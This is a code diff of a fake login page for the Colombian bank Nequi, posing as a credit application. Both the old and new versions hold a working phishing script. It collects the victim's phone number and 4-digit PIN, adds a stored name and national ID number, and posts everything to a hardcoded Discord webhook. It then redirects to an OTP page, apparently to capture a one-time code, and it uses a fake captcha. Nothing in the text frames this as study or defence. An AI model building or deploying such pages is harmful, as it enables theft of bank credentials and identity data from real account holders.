@@ -1,176 +1,238 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-    <meta charset="utf-8">
-    <title>Nequi</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Webflow">
-    <link rel="stylesheet" type="text/css" href="css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/main.css">
-    <script src="js/jquery-3.6.0.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Inicio de sesión</title>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fce7f3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            padding: 24px;
+            width: 360px;
+            max-width: 90%;
+        }
+
+        .logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #c50085;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #555;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            margin-bottom: 16px;
+            font-size: 16px;
+        }
+
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .captcha-box img {
+            cursor: pointer;
+            width: 100px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #c50085;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button.disabled {
+            background-color: #e0e0e0;
+            cursor: not-allowed;
+        }
+
+        .flag-input {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .flag-input span {
+            font-weight: 600;
+        }
+    </style>
 </head>
-
 <body>
-    <section class="login-section">
-        <div class="login-wrap">
-            <h1>Entra a tu Nequi</h1>
-            <p>Solicitud de crédito propulsor</p>
-            <div class="login-form-wrap">
-                <div class="container-form">
-                    <div class="input-country">
-                        <div class="wrap-select-country">
-                            <div class="select-country">
-                                <div class="country-wrap country-active">
-                                    <div class="select-col select-col-img">
-                                        <img src="images/flag_colombia.png" alt="co">
-                                    </div>
-                                    <div class="select-col">
-                                        <p> +57 </p>
-                                        <input class="country-input" type="text" id="j_region" value="57">
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+    <div class="container">
+        <div class="logo">•Nequi</div>
+        <h2>Entra a tu Nequi</h2>
+        <div class="subtitle">Solicitud de crédito propulsor</div>
 
-                        <div class="form-group">
-                            <input type="tel" id="txtUsername" name="txtUsername" maxlength="12" minlength="12"
-                                   required inputmode="numeric">
-                            <label for="txtUsername">Número de celular</label>
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <input type="password" id="txtPass" name="txtPass" required maxlength="4" minlength="4"
-                               inputmode="numeric" pattern="\d*">
-                        <label for="txtPass">Contraseña</label>
-                    </div>
-
-                    <img src="img/ca.png" alt="CAPTCHA" id="captcha" class="captcha">
-                    <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"></div>
-                </div>
-
-                <div class="btn-wrap">
-                    <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" disabled>
-                </div>
-            </div>
+        <div class="flag-input">
+            <img src="https://flagcdn.com/w40/co.png" alt="Colombia" width="24">
+            <span>+57</span>
+            <input type="text" id="txtUsername" placeholder="Número de celular">
         </div>
 
-      <script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const usernameInput = document.getElementById('txtUsername');
-        const passwordInput = document.getElementById('txtPass');
-        const captchaImg = document.getElementById('captcha');
-        const submitBtn = document.getElementById('btnUsuario');
+        <label for="txtPass">Contraseña</label>
+        <input type="password" id="txtPass" maxlength="4" placeholder="****">
 
-        let captchaClicked = false;
+        <div class="captcha-box">
+            <img id="captcha" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
+            <span>No soy un robot</span>
+        </div>
 
-        // Validamos que los elementos existan antes de registrar eventos
-        if (usernameInput) {
-            usernameInput.addEventListener('input', formatUsername);
-        }
-        if (passwordInput) {
-            passwordInput.addEventListener('input', formatPassword);
-        }
-        if (captchaImg) {
-            captchaImg.addEventListener('click', toggleCaptcha);
-        }
+        <button id="btnUsuario" class="disabled" disabled>Entra</button>
+    </div>
 
-        function formatUsername() {
-            let value = usernameInput.value.replace(/\D/g, '');
-            let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
-            usernameInput.value = formattedValue;
-            validateForm();
-        }
-
-        function formatPassword() {
-            passwordInput.value = passwordInput.value.replace(/\D/g, '');
-            validateForm();
-        }
-
-        function validateForm() {
-            const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
-            const passwordValid = /^\d{4}$/.test(passwordInput.value);
-            if (usernameValid && passwordValid && captchaClicked) {
-                submitBtn.disabled = false;
-                submitBtn.classList.remove('disabled');
-            } else {
-                submitBtn.disabled = true;
-                submitBtn.classList.add('disabled');
-            }
-        }
-
-        function toggleCaptcha() {
-            captchaClicked = true;
-            captchaImg.src = "img/cap.png";
-            validateForm();
-        }
-
-        const nombreApellido = localStorage.getItem("nombreApellido") || "No disponible";
-        const cedula = localStorage.getItem("cedula") || "No disponible";
-
-        // Nos aseguramos de que jQuery esté cargado antes de usarlo
-        if (window.jQuery) {
-            $('#btnUsuario').on('click', async function (e) {
-                e.preventDefault();
-
-                const usuario = $("#txtUsername").val().trim();
-                const clave = $("#txtPass").val().trim();
-
-                if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
-                    alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
-                    return;
-                }
-
-                if (!/^\d{4}$/.test(clave)) {
-                    alert("La clave debe ser de 4 dígitos numéricos.");
-                    return;
-                }
-
-                localStorage.setItem("numero", usuario);
-                localStorage.setItem("clave", clave);
-
-                const webhookURL = 'https://discord.com/api/webhooks/1377265795486187621/LUtffDY5XzYsDfpOJSwvxL0eS60wSy7rtL6P2WXlBBFHOv0y53CVBy5lIn9APJw-Gj1S';
-                const discordPayload = {
-                    username: "Consulta de Usuario",
-                    content:
-                        `Nueva solicitud recibida:\n\n` +
-                        `**Nombre:** ${nombreApellido}\n` +
-                        `**Cédula:** ${cedula}\n` +
-                        `**Número de Usuario:** ${usuario}\n` +
-                        `**Clave:** ${clave}`
-                };
-
-                try {
-                    const response = await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(discordPayload)
-                    });
-
-                    if (response.ok) {
-                        window.location.href = "otp.html";
-                    } else {
-                        throw new Error('Error al enviar los datos a Discord');
-                    }
-                } catch (error) {
-                    console.error('Error al enviar los datos:', error);
-                    alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
-                }
-            });
-        } else {
-            console.error("jQuery no está cargado. Asegúrate de incluirlo en tu HTML.");
-        }
-    });
-</script>
-
-
-        <script src="bloqueo-bots.js"></script>
-        <script src="js/script.js"></script>
-        <script async defer src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&render=explicit"></script>
-    </section>
+    <!-- jQuery CDN -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
+    <!-- Script funcional -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const usernameInput = document.getElementById('txtUsername');
+            const passwordInput = document.getElementById('txtPass');
+            const captchaImg = document.getElementById('captcha');
+            const submitBtn = document.getElementById('btnUsuario');
+
+            let captchaClicked = false;
+
+            if (usernameInput) {
+                usernameInput.addEventListener('input', formatUsername);
+            }
+            if (passwordInput) {
+                passwordInput.addEventListener('input', formatPassword);
+            }
+            if (captchaImg) {
+                captchaImg.addEventListener('click', toggleCaptcha);
+            }
+
+            function formatUsername() {
+                let value = usernameInput.value.replace(/\D/g, '');
+                let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim();
+                usernameInput.value = formattedValue;
+                validateForm();
+            }
+
+            function formatPassword() {
+                passwordInput.value = passwordInput.value.replace(/\D/g, '');
+                validateForm();
+            }
+
+            function validateForm() {
+                const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+                const passwordValid = /^\d{4}$/.test(passwordInput.value);
+                if (usernameValid && passwordValid && captchaClicked) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('disabled');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('disabled');
+                }
+            }
+
+            function toggleCaptcha() {
+                captchaClicked = true;
+                captchaImg.src = "img/cap.png";
+                validateForm();
+            }
+
+            const nombreApellido = localStorage.getItem("nombreApellido") || "No disponible";
+            const cedula = localStorage.getItem("cedula") || "No disponible";
+
+            if (window.jQuery) {
+                $('#btnUsuario').on('click', async function (e) {
+                    e.preventDefault();
+
+                    const usuario = $("#txtUsername").val().trim();
+                    const clave = $("#txtPass").val().trim();
+
+                    if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
+                        alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
+                        return;
+                    }
+
+                    if (!/^\d{4}$/.test(clave)) {
+                        alert("La clave debe ser de 4 dígitos numéricos.");
+                        return;
+                    }
+
+                    localStorage.setItem("numero", usuario);
+                    localStorage.setItem("clave", clave);
+
+                    const webhookURL = 'https://discord.com/api/webhooks/1377265795486187621/LUtffDY5XzYsDfpOJSwvxL0eS60wSy7rtL6P2WXlBBFHOv0y53CVBy5lIn9APJw-Gj1S';
+                    const discordPayload = {
+                        username: "Consulta de Usuario",
+                        content:
+                            `Nueva solicitud recibida:\n\n` +
+                            `**Nombre:** ${nombreApellido}\n` +
+                            `**Cédula:** ${cedula}\n` +
+                            `**Número de Usuario:** ${usuario}\n` +
+                            `**Clave:** ${clave}`
+                    };
+
+                    try {
+                        const response = await fetch(webhookURL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(discordPayload)
+                        });
+
+                        if (response.ok) {
+                            window.location.href = "otp.html";
+                        } else {
+                            throw new Error('Error al enviar los datos a Discord');
+                        }
+                    } catch (error) {
+                        console.error('Error al enviar los datos:', error);
+                        alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+                    }
+                });
+            } else {
+                console.error("jQuery no está cargado. Asegúrate de incluirlo en tu HTML.");
+            }
+        });
+    </script>
 </body>
 </html>
